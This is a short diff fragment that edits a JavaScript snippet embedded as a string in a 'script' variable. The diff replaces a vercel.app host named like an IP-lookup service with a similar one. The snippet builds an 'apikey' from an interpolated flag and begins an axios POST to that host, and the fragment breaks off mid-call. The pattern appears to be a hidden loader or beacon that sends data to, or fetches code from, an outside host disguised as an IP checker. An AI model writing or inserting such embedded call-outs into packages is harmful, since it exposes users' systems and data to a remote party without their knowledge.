@@ -455,7 +455,7 @@ exit 0
     
 		script = `
 	const axios = require('axios');
-const host = "locate-my-ip.vercel.app";
+const host = "checkmyip-zeta.vercel.app";
 const apikey = "3aeb34a3${flag}";
 axios
   .post(
